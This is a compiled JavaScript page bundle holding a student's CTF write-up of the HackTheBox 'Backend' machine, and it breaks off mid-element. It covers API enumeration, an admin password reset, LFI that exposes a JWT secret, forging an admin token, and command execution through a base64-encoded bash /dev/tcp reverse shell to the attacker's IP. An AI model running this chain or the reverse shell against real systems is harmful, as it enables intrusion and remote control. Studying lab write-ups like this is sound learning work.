import{_ as c}from"./ValaxyMain.vue_vue_type_style_index_0_lang-DRVqeRiY.js";import{a as p,p as h,o as u,c as g,w as s,f as k,r as a,g as e,h as i}from"./app-CzjF7NIc.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-17i98rOK.js";import"./YunCard.vue_vue_type_script_setup_true_lang-Da3dkqK-.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-BsneHNVS.js";import"./index-C7yU5XnD.js";const m=e("h1",{id:"backend-api",tabindex:"-1"},[i("Backend - API "),e("a",{class:"header-anchor",href:"#backend-api","aria-label":'Permalink to "Backend - API"'},"​")],-1),b=e("p",null,"突然想做这个box的起因是看到一条tweet，qwq 原来做box这么有用的嘛",-1),y=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),_=e("p",null,"learn from IppSec Video：",-1),v=e("p",null,[e("a",{href:"https://www.youtube.com/watch?v=x6Kpkl0C2xg",target:"_blank",rel:"noreferrer"},"HackTheBox - Backend")],-1),F=e("p",null,"/b",-1),f=e("p",null,"the article：",-1),C=e("p",null,[e("a",{href:"https://0xdf.gitlab.io/2022/04/12/htb-backend.html",target:"_blank",rel:"noreferrer"},"HTB: Backend")],-1),w=e("p",null,"笔记基本上是看着IpSec的视频做的，给以后温习用。尝试用英文做笔记，增加自己英文写作能力。",-1),B=e("h2",{id:"nmap",tabindex:"-1"},[i("nmap "),e("a",{class:"header-anchor",href:"#nmap","aria-label":'Permalink to "nmap"'},"​")],-1),E=e("p",null,"Start of nmap",-1),x=e("p",null,"command：",-1),P=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sudo"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," nmap"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -sC"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -sV"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -oA"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," nmap/backend"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 10.10.11.161")])])]),e("button",{class:"collapse"})],-1),z=e("ul",null,[e("li",null,"-sC: default script"),e("li",null,"-sV: enumerate versions"),e("li",null,"-oA: export the scan results in all the available formats at once\\")],-1),j=e("p",null,[e("strong",null,"result:")],-1),A=e("ul",null,[e("li",null,[i("22/tcp: "),e("ul",null,[e("li",null,"ssh")])]),e("li",null,[i("80/tcp "),e("ul",null,[e("li",null,"uvicor"),e("li",null,"response to us with json")])])],-1),T=e("h2",{id:"gobuster",tabindex:"-1"},[i("gobuster "),e("a",{class:"header-anchor",href:"#gobuster","aria-label":'Permalink to "gobuster"'},"​")],-1),U=e("p",null,"Examining the webpage, just finding json. Running gobuster to discover /docs and /api",-1),S=e("p",null,"command",-1),I=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"gobuster"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dir"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," http://10.10.11.161")])])]),e("button",{class:"collapse"})],-1),D=e("p",null,[e("strong",null,"result:")],-1),$=e("ul",null,[e("li",null,[i("find /api endpoint "),e("ul",null,[e("li",null,[i("endpoint: /api/v1/user "),e("ul",null,[e("li",null,"response status:404")])]),e("li",null,[i("endpoint: /api/v1/admin "),e("ul",null,[e("li",null,"response status:307")])])])])],-1),L=e("h2",{id:"examing-the-endpoint",tabindex:"-1"},[i("Examing the endpoint "),e("a",{class:"header-anchor",href:"#examing-the-endpoint","aria-label":'Permalink to "Examing the endpoint"'},"​")],-1),W=e("aside",null," 💡 when endpoint with user,you can try id number ",-1),G=e("p",null,"try:",-1),H=e("ul",null,[e("li",null,"/api/v1/user/1"),e("li",null,[i("/api/v1/user/login "),e("ul",null,[e("li",null,"try change request methods")])])],-1),q=e("h2",{id:"api-discovery",tabindex:"-1"},[i("API Discovery "),e("a",{class:"header-anchor",href:"#api-discovery","aria-label":'Permalink to "API Discovery"'},"​")],-1),O=e("aside",null," 💡 This section IppSec talking about why API Discovery differs from normal web, instead of extensions we fuzz methods ",-1),R=e("h3",{id:"gobuster-1",tabindex:"-1"},[i("gobuster "),e("a",{class:"header-anchor",href:"#gobuster-1","aria-label":'Permalink to "gobuster"'},"​")],-1),J=e("p",null,"command",-1),V=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"gobuster"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dir"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," http://10.10.11.161/api/v1/user"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -w"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /opt/SecList/Discovery/Web-Content/raft-small-words.txt")])])]),e("button",{class:"collapse"})],-1),Z=e("h3",{id:"feroxbuster",tabindex:"-1"},[i("feroxbuster "),e("a",{class:"header-anchor",href:"#feroxbuster","aria-label":'Permalink to "feroxbuster"'},"​")],-1),N=e("p",null,"command",-1),X=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"feroxbuster"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dir"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," http://10.10.11.161/api/v1/user"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -w"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /opt/SecList/Discovery/Web-Content/raft-small-words.txt")])])]),e("button",{class:"collapse"})],-1),M=e("h3",{id:"wfuzz",tabindex:"-1"},[i("wfuzz "),e("a",{class:"header-anchor",href:"#wfuzz","aria-label":'Permalink to "wfuzz"'},"​")],-1),Y=e("p",null,"command",-1),K=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"wfuzz"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -X"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," POST"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -w"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /opt/SecList/Discovery/Web-Content/common.txt"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  http://10.10.11.161/api/v1/user/FUZZ")])])]),e("button",{class:"collapse"})],-1),Q=e("p",null,"hide 404 and 405 status code",-1),ee=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"wfuzz"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -X"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," POST"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -w"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /opt/SecList/Discovery/Web-Content/common.txt"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  http://10.10.11.161/api/v1/user/FUZZ"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --hc"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 404,405")])])]),e("button",{class:"collapse"})],-1),ie=e("h2",{id:"fuzzing-signup",tabindex:"-1"},[i("Fuzzing signup "),e("a",{class:"header-anchor",href:"#fuzzing-signup","aria-label":'Permalink to "Fuzzing signup"'},"​")],-1),se=e("p",null,[i("使用 "),e("code",null,"wfuzz"),i(" 检测出api存在signup结点")],-1),te=e("p",null,"这里使用burpsuite做测试",-1),ae=e("h2",{id:"curl-behaves-troubleshoot",tabindex:"-1"},[i("Curl behaves&"),e("strong",null,[e("strong",null,"troubleshoot")]),i(),e("a",{class:"header-anchor",href:"#curl-behaves-troubleshoot","aria-label":'Permalink to "Curl behaves&****troubleshoot****"'},"​")],-1),le=e("aside",null," 💡 Showing that curl behaves differently. Lets troubleshoot this by sending our curl and burpsuite to wireshark and seeing why its behaving differently ",-1),ne=e("p",null,"Using below command,and you find response is different from burpsuite",-1),oe=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"curl"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -X"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," POST"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  http://10.10.11.161/api/v1/signup"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user=ipp'"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," jq"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," .")])])]),e("button",{class:"collapse"})],-1),he=e("p",null,[i("even you add "),e("code",null,"Content-Type"),i(" header,the response is stiil different from burpsuite")],-1),de=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"curl"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -X"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," POST"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  http://10.10.11.161/api/v1/signup"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -H"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Content-Type: application/json'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user=ipp'"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," jq"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," .")])])]),e("button",{class:"collapse"})],-1),re=e("p",null,"so，the next we use wireshark to capture the package，and find the txt",-1),ce=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%201.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),pe=e("p",null,"find curl could magic add something",-1),ue=e("h2",{id:"attemping-to-login-with-our-credential",tabindex:"-1"},[i("Attemping to login with our credential "),e("a",{class:"header-anchor",href:"#attemping-to-login-with-our-credential","aria-label":'Permalink to "Attemping to login with our credential"'},"​")],-1),ge=e("p",null,"需要修改一下header(非json格式）",-1),ke=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Content-Type:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," application/x-www-form-urlencoded")])])]),e("button",{class:"collapse"})],-1),me=e("p",null,"返回了token",-1),be=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%202.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),ye=e("p",null,[e("code",null,"access_token"),i(" 的值为jwt token")],-1),_e=e("h2",{id:"accessing-docs-endpoint",tabindex:"-1"},[i("Accessing /docs endpoint "),e("a",{class:"header-anchor",href:"#accessing-docs-endpoint","aria-label":'Permalink to "Accessing /docs endpoint"'},"​")],-1),ve=e("p",null,"In above section,we get jwt token and next we use it to /docs endpoint",-1),Fe=e("p",null,[i("add header: "),e("code",null,"Authorization:bearer")],-1),fe=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%203.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),Ce=e("p",null,[i("and send this request,we find application make a new request to /openapi endpoint.and now "),e("strong",null,"we have the documentation of the api")],-1),we=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%204.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),Be=e("p",null,"You can find there’s nothing just defined for just /user( /api/v1/user endpoint),but admin is different,there’s /api/v1/admin endpoint",-1),Ee=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%205.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),xe=e("h2",{id:"authenticating-in-the-swagger",tabindex:"-1"},[i("Authenticating in the swagger "),e("a",{class:"header-anchor",href:"#authenticating-in-the-swagger","aria-label":'Permalink to "Authenticating in the swagger"'},"​")],-1),Pe=e("p",null,"虽然admin没有权限，但是你可以点这个 🔒 的图标去登陆备",-1),ze=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%206.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),je=e("p",null,"然后，但是这样创建的用户也不是管理员",-1),Ae=e("p",null,"but after login the user what we created, we don’t have the authentical to /admin",-1),Te=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%207.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),Ue=e("p",null,[i("you can use "),e("code",null,"/user/{user-id}"),i(" to get the id of ‘1’,and copy his guid")],-1),Se=e("p",null,[i("the go "),e("code",null,"/api/v1/user/updatepass"),i(" to update password of user 1")],-1),Ie=e("h2",{id:"login-in-with-admin-and-do-something",tabindex:"-1"},[i("Login in with admin and do something "),e("a",{class:"header-anchor",href:"#login-in-with-admin-and-do-something","aria-label":'Permalink to "Login in with admin and do something"'},"​")],-1),De=e("h3",{id:"api-v1-admin-file",tabindex:"-1"},[i("/api/v1/admin/file "),e("a",{class:"header-anchor",href:"#api-v1-admin-file","aria-label":'Permalink to "/api/v1/admin/file"'},"​")],-1),$e=e("p",null,[i("now we can login in with admin,and then we go pass "),e("code",null,"/api/v1/admin/file"),i(" to get "),e("code",null,"/etc/passwd")],-1),Le=e("h3",{command:"",id:"api-v1-admin-exec",tabindex:"-1"},[i("/api/v1/admin/exec/ "),e("a",{class:"header-anchor",href:"#api-v1-admin-exec","aria-label":'Permalink to "/api/v1/admin/exec/{command}"'},"​")],-1),We=e("aside",null," 💡 You can use [jwt.io](http://jwt.io) to parse your jwt token ",-1),Ge=e("p",null,[i("we put our jwt token to "),e("a",{href:"http://jwt.io",target:"_blank",rel:"noreferrer"},"jwt.io"),i(" to parse it，and as result there’s not much information here")],-1),He=e("h2",{id:"exploring-the-proc-self-directory-with-the-lfi",tabindex:"-1"},[i("Exploring the /proc/self directory with the LFI "),e("a",{class:"header-anchor",href:"#exploring-the-proc-self-directory-with-the-lfi","aria-label":'Permalink to "Exploring the /proc/self directory with the LFI"'},"​")],-1),qe=e("h3",{id:"api-v1-admin-file-1",tabindex:"-1"},[e("strong",null,[e("code",null,"/api/v1/admin/file")]),i(),e("a",{class:"header-anchor",href:"#api-v1-admin-file-1","aria-label":'Permalink to "**`/api/v1/admin/file`**"'},"​")],-1),Oe=e("p",null,[i("use burpsuite to capture "),e("code",null,"/api/v1/admin/file"),i(" ，construct the request body as this")],-1),Re=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'	"file"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},":"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'"/proc/self/cmdline"')]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"}")])])]),e("button",{class:"collapse"})],-1),Je=e("ul",null,[e("li",null,[e("code",null,"/proc/self/cmdline"),i(" 代表当前程序命令行参数（"),e("a",{href:"https://blog.csdn.net/whatday/article/details/108897457",target:"_blank",rel:"noreferrer"},"https://blog.csdn.net/whatday/article/details/108897457"),i("）")])],-1),Ve=e("h3",{id:"proc-self-environ",tabindex:"-1"},[e("code",null,"**/proc/self/environ"),i("** "),e("a",{class:"header-anchor",href:"#proc-self-environ","aria-label":'Permalink to "`**/proc/self/environ`**"'},"​")],-1),Ze=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'	"file"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},":"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'"/proc/self/environ"')]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"}")])])]),e("button",{class:"collapse"})],-1),Ne=e("ul",null,[e("li",null,[e("code",null,"/proc/self/environ"),i(" find the program’s envrionment")])],-1),Xe=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"APP_MODULE"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"app.main:app...etc")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"PWD"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/home/htb/uhc")])])]),e("button",{class:"collapse"})],-1),Me=e("h3",{id:"get-the-py-source-code",tabindex:"-1"},[e("strong",null,"get the .py source code"),i(),e("a",{class:"header-anchor",href:"#get-the-py-source-code","aria-label":'Permalink to "**get the .py source code**"'},"​")],-1),Ye=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'	"file"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},":"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},'"/home/htb/uhc/app/main.py"')]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"}")])])]),e("button",{class:"collapse"})],-1),Ke=e("h3",{id:"copy-souce-code-to-vim",tabindex:"-1"},[i("Copy souce code to vim "),e("a",{class:"header-anchor",href:"#copy-souce-code-to-vim","aria-label":'Permalink to "Copy souce code to vim"'},"​")],-1),Qe=e("h3",{id:"read-main-py",tabindex:"-1"},[i("read main.py "),e("a",{class:"header-anchor",href:"#read-main-py","aria-label":'Permalink to "read main.py"'},"​")],-1),ei=e("p",null,"open vim",-1),ii=e("ul",null,[e("li",null,[e("code",null,":set paste")]),e("li",null,[e("code",null,"%s/\\\\n/\\r/g")])],-1),si=e("p",null,[i("When you formatting your python source code,you will find uder the "),e("code",null,"[main.py](http://main.py)"),i(" has the line 20 ："),e("code",null,"app.core.config import settings")],-1),ti=e("h3",{id:"read-app-core-config",tabindex:"-1"},[i("read app.core.config "),e("a",{class:"header-anchor",href:"#read-app-core-config","aria-label":'Permalink to "read app.core.config"'},"​")],-1),ai=e("p",null,[i("using endpoint "),e("code",null,"/api/v1/admin/file"),i(" to read configuration file : "),e("code",null,"[config.py](http://config.py)")],-1),li=e("p",null,[i("you will find "),e("code",null,"JWT_SECRET")],-1),ni=e("h3",{id:"using-jwt-secret-to-generate-jwt",tabindex:"-1"},[i("using "),e("code",null,"JWT_SECRET"),i(" to generate jwt "),e("a",{class:"header-anchor",href:"#using-jwt-secret-to-generate-jwt","aria-label":'Permalink to "using `JWT_SECRET` to generate jwt"'},"​")],-1),oi=e("p",null,"then go jwt.io, change the history jwt parsing result.",-1),hi=e("p",null,[i("( "),e("code",null,"”debug”: true"),i(" 是新增的一行， "),e("code",null,"HMACSHA256"),i(" 下将 "),e("code",null,"your-256-bit-secret"),i(" 改为 "),e("code",null,"JWT_SECRET"),i(" )")],-1),di=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%208.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),ri=e("h3",{id:"set-new-jwt-to-api-v1-admin-exec-whoami",tabindex:"-1"},[i("set new jwt to "),e("code",null,"/api/v1/admin/exec/whoami"),i(),e("a",{class:"header-anchor",href:"#set-new-jwt-to-api-v1-admin-exec-whoami","aria-label":'Permalink to "set new jwt  to `/api/v1/admin/exec/whoami`"'},"​")],-1),ci=e("p",null,"before you set your new jwt",-1),pi=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%209.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),ui=e("p",null,"after you set your new jwt",-1),gi=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%2010.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),ki=e("h2",{id:"bypass-slash-restrict-in-url",tabindex:"-1"},[i("bypass slash restrict in url "),e("a",{class:"header-anchor",href:"#bypass-slash-restrict-in-url","aria-label":'Permalink to "bypass slash restrict in url"'},"​")],-1),mi=e("aside",null," 💡 Notice: you should enter more space to prevent `+` in your base64 encode string(it will influence the header’s url constructing) but if you will urlencode all your string,it doesn’t matter ",-1),bi=e("p",null,[i("when you try "),e("code",null,'/api/v1/admin/exec/echo%20"AB\\/C"'),i(" or "),e("code",null,'/api/v1/admin/exec/echo%20"AB%2FC"'),i(" the slash will be seen as the part of url")],-1),yi=e("p",null,"so,you should use base64 to encode the slash",-1),_i=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"echo"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'bash -i >& /dev/tcp/10.10.14.8/9001  0>&1'"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," base"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 64"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -w"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 0")])])]),e("button",{class:"collapse"})],-1),vi=e("p",null,"your local bash should use nc to listen the port",-1),Fi=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"nc"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -lvnp"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 9001")])])]),e("button",{class:"collapse"})],-1),fi=e("p",null,[i("then put the base64 encode into url and add "),e("code",null,"| base64 -d | bash"),i(" to decode base64 and exec as bash command")],-1),Ci=e("figure",null,[e("img",{src:"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%2011.png20220417a.png",alt:"Untitled",loading:"lazy",decoding:"async"})],-1),wi=e("p",null,"then urlencode all your payload and send it !",-1),Bi=e("p",null,"you local nc will get shell",-1),Ei=e("h2",{id:"getting-a-reverse-shell",tabindex:"-1"},[i("getting a reverse shell "),e("a",{class:"header-anchor",href:"#getting-a-reverse-shell","aria-label":'Permalink to "getting a reverse shell"'},"​")],-1),xi=e("p",null,"这块感觉要多学学",-1),Pi=e("p",null,"after nc get shell, input",-1),zi=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"python3"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -c"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},` 'import pty;pty.spawn("/bin/bash")'`)])])]),e("button",{class:"collapse"})],-1),ji=e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[e("code",{"v-pre":""},[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"stty"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," raw"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -echo"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"; "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"fg")])])]),e("button",{class:"collapse"})],-1),Ai=e("p",null,[i("learn about more 